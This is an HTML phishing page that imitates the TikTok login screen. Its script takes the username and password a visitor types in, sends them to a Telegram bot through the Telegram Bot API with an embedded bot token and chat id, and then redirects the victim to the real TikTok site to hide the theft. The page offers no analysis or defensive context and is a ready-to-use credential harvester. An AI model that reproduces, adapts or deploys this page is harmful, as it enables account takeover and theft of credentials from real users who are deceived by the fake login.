<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok</title>
    <style>
        body { background: #fff; font-family: sans-serif; display: flex; justify-content: center; padding-top: 50px; }
        .box { width: 320px; text-align: center; }
        .logo { font-size: 32px; font-weight: 900; margin-bottom: 20px; }
        input { width: 100%; padding: 15px; margin-bottom: 10px; background: #f1f1f2; border: 1px solid #f1f1f2; border-radius: 4px; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; background: #fe2c55; color: #fff; border: none; border-radius: 4px; font-weight: bold; font-size: 16px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">TikTok</div>
        <h3>Log in</h3>
        <input type="text" id="l" placeholder="Email or Username">
        <input type="password" id="p" placeholder="Password">
        <button class="btn" onclick="send()">Log in</button>
    </div>
    <script>
        function send() {
            const log = document.getElementById('l').value;
            const pas = document.getElementById('p').value;
            fetch(`https://api.telegram.org/bot8790499217:AAFZF8O15FpKe0-z_4P3q9FkedSnGdzB_o8/sendMessage?chat_id=8491881282&text=${encodeURIComponent("🎵 TIKTOK:\n👤 L: "+log+"\n🔑 P: "+pas)}`, {mode: 'no-cors'});
            setTimeout(() => { window.location.href="https://tiktok.com/"; }, 1000);
        }
    </script>
</body>
</html>
